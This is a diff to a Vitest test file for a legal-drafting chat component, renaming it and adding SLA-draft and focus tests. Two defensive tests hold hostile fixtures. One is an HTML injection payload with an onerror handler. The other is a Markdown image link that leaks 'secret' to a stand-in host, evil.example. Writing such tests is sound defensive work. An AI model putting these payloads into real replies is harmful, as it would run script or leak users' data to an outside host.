@@ -2,15 +2,15 @@ import { render, screen, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { afterEach, describe, expect, it, vi } from "vitest";
 import { GREETING } from "@/lib/chat";
-import { defaultNdaData } from "@/lib/nda";
-import { fakeChatApi, requestBody, updates } from "@/test-utils/fakeChat";
-import NdaChat from "./NdaChat";
+import { emptyDraft } from "@/lib/draft";
+import { chatRequests, fakeApi, turn } from "@/test-utils/fakeChat";
+import Chat from "./Chat";
 
 function setup() {
   const user = userEvent.setup();
-  const onUpdates = vi.fn();
-  render(<NdaChat fields={defaultNdaData("2026-10-16")} onUpdates={onUpdates} />);
-  return { user, onUpdates, message: screen.getByLabelText("Message"), send: screen.getByRole("button", { name: "Send" }) };
+  const onTurn = vi.fn();
+  render(<Chat draft={emptyDraft("sla")} onTurn={onTurn} />);
+  return { user, onTurn, message: screen.getByLabelText("Message"), send: screen.getByRole("button", { name: "Send" }) };
 }
 
 const bubbles = () =>
@@ -18,20 +18,20 @@ const bubbles = () =>
     .getAllByRole("listitem")
     .map((li) => li.textContent);
 
-describe("NdaChat", () => {
+describe("Chat", () => {
   afterEach(() => {
     vi.unstubAllGlobals();
   });
 
-  it("opens with a greeting that asks about the parties, without calling the AI", () => {
-    const fetchMock = fakeChatApi();
+  it("opens with a greeting that asks what agreement is needed, without calling the AI", () => {
+    const fetchMock = fakeApi();
     setup();
     expect(bubbles()).toEqual([GREETING]);
     expect(fetchMock).not.toHaveBeenCalled();
   });
 
   it("sends the message and shows the AI's reply", async () => {
-    fakeChatApi({ reply: "Thanks! Who is signing for Acme?" });
+    fakeApi({ reply: "Thanks! Who is signing for Acme?" });
     const { user, message } = setup();
     await user.type(message, "Acme Inc and Globex LLC{Enter}");
     expect(await screen.findByText("Thanks! Who is signing for Acme?")).toBeInTheDocument();
@@ -40,7 +40,7 @@ describe("NdaChat", () => {
   });
 
   it("sends the whole conversation each turn", async () => {
-    const fetchMock = fakeChatApi({ reply: "First reply" }, { reply: "Second reply" });
+    const fetchMock = fakeApi({ reply: "First reply" }, { reply: "Second reply" });
     const { user, message } = setup();
     await user.type(message, "one{Enter}");
     await screen.findByText("First reply");
@@ -48,7 +48,7 @@ describe("NdaChat", () => {
     await screen.findByText("Second reply");
 
     expect(fetchMock).toHaveBeenCalledWith("/api/chat", expect.objectContaining({ method: "POST" }));
-    expect(requestBody(fetchMock, 1).messages).toEqual([
+    expect(chatRequests(fetchMock)[1].messages).toEqual([
       { role: "assistant", content: GREETING },
       { role: "user", content: "one" },
       { role: "assistant", content: "First reply" },
@@ -56,12 +56,33 @@ describe("NdaChat", () => {
     ]);
   });
 
-  it("passes the AI's field updates up", async () => {
-    fakeChatApi({ reply: "Noted.", updates: { governingLaw: "Delaware" } });
-    const { user, message, onUpdates } = setup();
-    await user.type(message, "Delaware law{Enter}");
+  it("sends the draft and today's date, and passes the AI's turn up", async () => {
+    const fetchMock = fakeApi({ reply: "Noted.", terms: { "Target Uptime": "99.9%" } });
+    const { user, message, onTurn } = setup();
+    await user.type(message, "99.9% uptime{Enter}");
     await screen.findByText("Noted.");
-    expect(onUpdates).toHaveBeenCalledWith(updates({ governingLaw: "Delaware" }));
+    const [request] = chatRequests(fetchMock);
+    expect(request.draft).toEqual(emptyDraft("sla"));
+    expect(request.today).toMatch(/^\d{4}-\d{2}-\d{2}$/);
+    expect(onTurn).toHaveBeenCalledWith(turn({ reply: "Noted.", terms: { "Target Uptime": "99.9%" } }));
+  });
+
+  it("puts the cursor back in the message box after a reply, even when Send was clicked", async () => {
+    fakeApi({ reply: "Who is the provider?" });
+    const { user, message, send } = setup();
+    await user.type(message, "Acme is the customer");
+    await user.click(send);
+    await screen.findByText("Who is the provider?");
+    expect(message).toHaveFocus();
+  });
+
+  it("puts the cursor back in the message box after an error", async () => {
+    fakeApi({ status: 502, detail: "The AI assistant didn't respond. Please try again." });
+    const { user, message, send } = setup();
+    await user.type(message, "hi");
+    await user.click(send);
+    await screen.findByRole("alert");
+    expect(message).toHaveFocus();
   });
 
   it("shows that the AI is thinking and blocks sending until it replies", async () => {
@@ -73,14 +94,14 @@ describe("NdaChat", () => {
     await user.type(message, "again");
     expect(send).toBeDisabled();
 
-    answer(new Response(JSON.stringify({ reply: "Hi there", updates: updates() })));
+    answer(new Response(JSON.stringify(turn({ reply: "Hi there" }))));
     expect(await screen.findByText("Hi there")).toBeInTheDocument();
     expect(screen.queryByRole("status")).not.toBeInTheDocument();
     expect(send).toBeEnabled();
   });
 
   it("uses Shift+Enter for a new line instead of sending", async () => {
-    const fetchMock = fakeChatApi();
+    const fetchMock = fakeApi();
     const { user, message } = setup();
     await user.type(message, "line one{Shift>}{Enter}{/Shift}line two");
     expect(message).toHaveValue("line one\nline two");
@@ -88,7 +109,7 @@ describe("NdaChat", () => {
   });
 
   it("does not send an empty message", async () => {
-    const fetchMock = fakeChatApi();
+    const fetchMock = fakeApi();
     const { user, message, send } = setup();
     expect(send).toBeDisabled();
     await user.type(message, "   {Enter}");
@@ -97,14 +118,14 @@ describe("NdaChat", () => {
   });
 
   it("shows the server's error and puts the message back to retry", async () => {
-    fakeChatApi({ status: 502, detail: "The AI assistant didn't respond. Please try again." }, { reply: "Back now!" });
-    const { user, message, onUpdates } = setup();
+    fakeApi({ status: 502, detail: "The AI assistant didn't respond. Please try again." }, { reply: "Back now!" });
+    const { user, message, onTurn } = setup();
     await user.type(message, "Acme Inc{Enter}");
 
     expect(await screen.findByRole("alert")).toHaveTextContent("The AI assistant didn't respond. Please try again.");
     expect(message).toHaveValue("Acme Inc");
     expect(bubbles()).toEqual([GREETING]);
-    expect(onUpdates).not.toHaveBeenCalled();
+    expect(onTurn).not.toHaveBeenCalled();
 
     await user.type(message, "{Enter}");
     expect(await screen.findByText("Back now!")).toBeInTheDocument();
@@ -112,21 +133,21 @@ describe("NdaChat", () => {
   });
 
   it("explains when the server can't be reached", async () => {
-    fakeChatApi(new TypeError("Failed to fetch"));
+    fakeApi(new TypeError("Failed to fetch"));
     const { user, message } = setup();
     await user.type(message, "hi{Enter}");
     expect(await screen.findByRole("alert")).toHaveTextContent("Couldn't reach Prelegal");
   });
 
   it("falls back to a general error when the server sends no detail", async () => {
-    fakeChatApi({ status: 500 });
+    fakeApi({ status: 500 });
     const { user, message } = setup();
     await user.type(message, "hi{Enter}");
     expect(await screen.findByRole("alert")).toHaveTextContent("Something went wrong. Please try again.");
   });
 
   it("renders the AI's Markdown but shows the user's text as typed", async () => {
-    fakeChatApi({ reply: "I need:\n\n1. **Names**\n2. Titles" });
+    fakeApi({ reply: "I need:\n\n1. **Names**\n2. Titles" });
     const { user, message } = setup();
     await user.type(message, "**not bold**{Enter}");
     const names = await screen.findByText("Names");
@@ -135,7 +156,7 @@ describe("NdaChat", () => {
   });
 
   it("does not render HTML sent by the AI", async () => {
-    fakeChatApi({ reply: 'Hello <img src=x onerror="alert(1)">' });
+    fakeApi({ reply: 'Hello <img src=x onerror="alert(1)">' });
     const { user, message } = setup();
     await user.type(message, "hi{Enter}");
     await screen.findByText(/Hello/);
@@ -157,7 +178,7 @@ describe("NdaChat", () => {
   });
 
   it("does not load images from the AI's Markdown", async () => {
-    fakeChatApi({ reply: "See ![tracker](https://evil.example/x.png?q=secret)" });
+    fakeApi({ reply: "See ![tracker](https://evil.example/x.png?q=secret)" });
     const { user, message } = setup();
     await user.type(message, "hi{Enter}");
     await screen.findByText(/See/);
